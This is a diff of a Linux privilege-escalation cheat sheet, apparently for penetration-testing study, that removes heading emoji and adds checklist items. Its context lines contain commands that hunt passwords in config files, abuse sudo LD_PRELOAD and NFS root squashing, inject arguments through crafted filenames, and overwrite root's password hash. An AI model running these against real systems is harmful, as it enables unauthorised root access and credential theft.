@@ -42,16 +42,20 @@ find / -name .htpasswd -readable 2>/dev/null
 find /var/www -type f -name "wp-config.php" -o -name "configuration.php" -o -name "config.inc.php" 2>/dev/null | xargs grep -l -i "password\|user"
 ```
 
-## 📝 Comprehensive Methodology Checklist
+## Methodology Checklist
 
 ### 1. Initial Reconnaissance
 
 - [ ] Check current user (`id`, `whoami`)
 - [ ] Check system info (`uname -a`, `hostname`, `cat /etc/os-release`)
 - [ ] List users on the system (`cat /etc/passwd`, `ls -la /home`)
+- [ ] Try using username as pass for all the users you identify on the system
+- [ ] If any interesting users are present note them to try looking for their creds
 - [ ] Check groups you belong to (`id`, `groups`)
 - [ ] Run automated scripts (LinPEAS, LSE, LinEnum)
 - [ ] Review command output for "red flags" highlighting potential vulns
+- [ ] Check for root crons using pspy
+- [ ] Check for setuid and capabilties files for potential abuse
 
 ### 2. Privilege Escalation Vectors
 
@@ -181,7 +185,7 @@ perl linux-exploit-suggester-2.pl
 4. Compile on target system (if possible) or cross-compile(use the -static flag when you can and remeber glibc and library dependencies)
 
 
-## 🔑 Password Mining & Credentials Hunting
+## Password Mining & Credentials Hunting
 
 ### User Home Directories
 
@@ -301,7 +305,7 @@ find /var/log -type f -name "*.log" -readable -exec grep -l -i "password\|login\
 find / -type d -name ".*" -ls 2>/dev/null | grep -v "^\.\.$"
 ```
 
-## 👑 SUDO Exploitation
+##  SUDO Exploitation
 
 ### Understanding Sudo Rights
 
@@ -404,7 +408,7 @@ sudo LD_PRELOAD=/tmp/preload.so <allowed_command>
 /tmp/rootbash -p
 ```
 
-## 📁 NFS Root Squashing Exploitation
+##  NFS Root Squashing Exploitation
 
 ### Understanding NFS and Root Squashing
 
@@ -481,7 +485,7 @@ cp /shared/directory/passwd /etc/passwd
 
 **CAUTION**: If you get "file or directory not found" but can cat the file, you may be running a 64-bit executable on a 32-bit system (or vice versa).
 
-## 🔍 Group Membership Exploitation
+##  Group Membership Exploitation
 
 ### Identifying Group Memberships and Permissions
 
@@ -508,7 +512,7 @@ for group in $(groups); do find / -type f -group $group -perm -u=x 2>/dev/null |
 stat /etc/passwd /etc/shadow /etc/group
 ```
 
-## ⏱️ Cron Job Exploitation
+##  Cron Job Exploitation
 
 Cron jobs are scheduled tasks in Linux systems. When these jobs are executed with root privileges, they present potential privilege escalation vectors.
 
@@ -661,7 +665,7 @@ touch /home/user/-e sh\ shell.sh
 touch /home/user/--reference=shell.sh
 ```
 
-## 📌 SUID/SGID Binary Exploitation
+##  SUID/SGID Binary Exploitation
 
 ### Understanding SUID/SGID
 
@@ -885,7 +889,7 @@ for suid in $(find / -perm -4000 -type f 2>/dev/null); do
 done
 ```
 
-## 🚀 Startup Script & Service Exploitation
+##  Startup Script & Service Exploitation
 
 ### Identifying Vulnerable Startup Scripts
 
@@ -1122,7 +1126,7 @@ openssl passwd -1 -salt xyz newpassword
 # Add new user with hash or modify root's hash 
 ```
 
-## 🔭 Port Forwarding for Internal Services
+##  Port Forwarding for Internal Services
 
 ```bash
 # Check for locally listening services that might be running as root
@@ -1144,7 +1148,7 @@ ssh -D <local_port> <username>@<target>
 # Then configure proxychains to use this SOCKS proxy
 ```
 
-## 🗄️ File Permission Exploitation
+## File Permission Exploitation
 
 ### Finding World-Writable Files
 
